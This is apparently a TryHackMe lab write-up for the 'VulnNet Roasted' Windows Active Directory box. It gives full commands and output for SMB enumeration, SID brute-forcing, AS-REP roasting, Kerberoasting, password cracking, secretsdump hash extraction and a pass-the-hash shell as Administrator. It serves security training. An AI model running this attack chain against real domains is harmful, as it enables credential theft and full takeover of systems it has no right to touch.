---
layout: post
title:  "THM - VulnNet Roasted"
image: /images/kerb.jpg
---

## THM - VulnNet Roasted

#### Port Scan

```bash
┌──(kali㉿Zeus)-[~]
└─$ sudo nmap -A -O -sS 10.10.219.195       
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 12:20 EEST
Nmap scan report for 10.10.219.195 (10.10.219.195)
Host is up (0.13s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-10 09:20:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-10T09:20:42
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   79.55 ms  10.8.0.1 (10.8.0.1)
2   133.68 ms 10.10.219.195 (10.10.219.195)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.17 seconds
```

#### SMBClient - Enum 

```powershell
┌──(kali㉿Zeus)-[~]
└─$ smbclient -L \\vulnnet-rst.local -I 10.10.219.195  -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
```

#### SMBClient - Anonymous

- username : anonymous
- password : there is no password for user anonymous

```bash
┌──(kali㉿Zeus)-[~]
└─$ smbclient //vulnnet-rst.local/VulnNet-Enterprise-Anonymous -U anonymous                                                         130 ⨯
Enter WORKGROUP\anonymous's password: <ENTER>
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Mar 13 04:46:40 2021
  ..                                  D        0  Sat Mar 13 04:46:40 2021
  Enterprise-Operations.txt           A      467  Fri Mar 12 03:24:34 2021
  Enterprise-Safety.txt               A      503  Fri Mar 12 03:24:34 2021
  Enterprise-Sync.txt                 A      496  Fri Mar 12 03:24:34 2021

                8771839 blocks of size 4096. 4555650 blocks available
smb: \>
```

#### Lookup SID

 A Windows SID brute force script, aiming at finding remote users/groups.
 
- syntax 

```bash
python3 lookupsid.py test.local/john:password123@10.10.10.1
```

- now

```bash
python3 lookupsid.py vulnnet-rst.local/anonymous@10.10.219.195
```

- result

```bash
┌──(kali㉿Zeus)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 lookupsid.py vulnnet-rst.local/anonymous@10.10.219.195                            
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.219.195
[*] StringBinding ncacn_np:10.10.219.195[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

###### Users

```text
Administrator
Guest
krbtgt
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

#### Get NP Users

This example will attempt to list and get TGTs for those users that have the property "Do not require Kerberos preauthentication".

- syntax

```bash
[python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt](https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/)
```

- now 

```bash
python3 GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.219.195 -usersfile users.txt -format john -outputfile hashes.txt
```

- result 

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ python3 GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.219.195 -usersfile users.txt -format john -outputfile hashes.txt                                                       1 ⚙
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
    
┌──(kali㉿Zeus)-[~/Desktop]
└─$ cat hashes.txt                           
$krb5asrep$t-skid@VULNNET-RST.LOCAL:a1c7fff560eb83deb0834<REDACTED>
```

#### John The Ripper

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- result

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ john hashes.txt --show                                                   
$krb5asrep$t-skid@VULNNET-RST.LOCAL:tj<redacted>
1 password hash cracked, 0 left
```

#### Get User SPNs

This example will try to find and fetch Service Principal Names that are associated with normal user accounts.

- syntax

```bash
[python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request](https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/)
```

- now

```bash
python3 GetUserSPNs.py vulnnet-rst.local/t-skid:tj<redacted> -dc-ip 10.10.219.195 -request
```

- result

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ python3 GetUserSPNs.py vulnnet-rst.local/t-skid:tj<redacted> -dc-ip 10.10.219.195 -request 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 21:45:09.913979  2021-03-14 01:41:17.987528             

$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$8768dfa1d<REDACTED>
```

#### John The Ripper

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ john ticket.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                  1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
ry<redacted> (?)
1g 0:00:00:12 DONE (2021-09-10 13:32) 0.07806g/s 320709p/s 320709c/s 320709C/s rya217..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed
        
┌──(kali㉿Zeus)-[~/Desktop]
└─$ john ticket.txt --show 
?:ry<redacted>

1 password hash cracked, 0 left                                                             
```

#### Further Enumeration

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ smbclient //10.10.219.195/SYSVOL -U enterprise-core-vn%'ry<redacted>'   
smb: \> dir
  .                                   D        0  Thu Mar 11 21:19:49 2021
  ..                                  D        0  Thu Mar 11 21:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 21:19:49 2021

                8771839 blocks of size 4096. 4534610 blocks available
smb: \> cd vulnnet-rst.local
smb: \vulnnet-rst.local\> dir
  .                                   D        0  Thu Mar 11 21:23:40 2021
  ..                                  D        0  Thu Mar 11 21:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 21:23:40 2021
  Policies                            D        0  Thu Mar 11 21:20:26 2021
  scripts                             D        0  Wed Mar 17 01:15:49 2021

                8771839 blocks of size 4096. 4534593 blocks available
smb: \vulnnet-rst.local\> cd scripts
smb: \vulnnet-rst.local\scripts\> dir
  .                                   D        0  Wed Mar 17 01:15:49 2021
  ..                                  D        0  Wed Mar 17 01:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 01:18:14 2021

                8771839 blocks of size 4096. 4530605 blocks available
smb: \vulnnet-rst.local\scripts\> mget ResetPassword.vbs
Get file ResetPassword.vbs? y
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\>
```


#### ResetPassword VB Script

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ cat ResetPassword.vbs
...
strUserNTName = "a-whitehat"
strPassword = "bN<redacted>"
...
```

#### Secret Dump

Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method.

- syntax

```bash
python3 secretsdump.py test.local/john:password123@10.10.10.1
```

- now

```bash
python3 secretsdump.py vulnnet-rst.local/a-whitehat:bN<redacted>@10.10.219.195
```

- result

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ python3 secretsdump.py vulnnet-rst.local/a-whitehat:bN<redacted>@10.10.219.195                                       
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c259<redacted>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

#### System

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ evil-winrm -i 10.10.219.195  -u Administrator  -H c259<redacted>    

Evil-WinRM shell v3.3

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

#### Resources

https://www.secureauth.com/labs/open-source-tools/impacket/

https://wadcoms.github.io/